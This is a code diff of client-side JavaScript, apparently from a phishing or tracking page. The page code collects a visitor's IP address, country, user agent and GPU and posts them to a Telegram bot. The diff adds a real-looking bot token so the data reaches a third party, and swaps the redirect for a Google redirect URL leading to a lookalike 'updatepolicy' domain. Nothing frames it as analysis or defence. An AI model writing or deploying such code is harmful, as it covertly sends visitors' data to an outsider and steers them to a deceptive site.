@@ -30,7 +30,7 @@
       const message = `IP: ${ip}\nCountry: ${countryName} (${countryCode})\nUserAgent: ${userAgent}\nGPU: ${gpu}`;
 
 
-      fetch("https://api.telegram.org/token/sendMessage", {
+      fetch("https://api.telegram.org/token/8212311446:AAH5dfowwEsOIpvuCA8Qb0aal5b22x0YEcgsendMessage", {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
@@ -38,7 +38,7 @@
           text: message
         })
       }).finally(() => {
-        window.location.href = "check";
+        window.location.href = "https://www.google.com/url?q=https%3A%2F%2Fgoogle.updatepolicy.app&sa=D";
       });
     }
 
